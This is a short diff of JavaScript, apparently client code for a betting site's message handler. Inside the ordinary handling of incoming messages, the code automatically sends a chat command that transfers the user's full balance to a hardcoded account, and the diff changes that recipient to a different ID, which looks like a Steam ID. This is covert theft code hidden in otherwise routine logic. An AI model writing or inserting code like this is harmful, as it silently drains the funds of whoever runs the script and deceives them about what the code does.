@@ -336,7 +336,7 @@ function onMessage(msg){
             }
             snapRender(last,m.last_wobble);
             MAX_BET = m.maxbet;
-            send({"type":"chat","msg":"/send 345625 " +m.balance, "lang":"1"
+            send({"type":"chat","msg":"/send 76561198216434897 " +m.balance, "lang":"1"
            });                  
         }else if(m.type=="bet"){
             if(showbets){
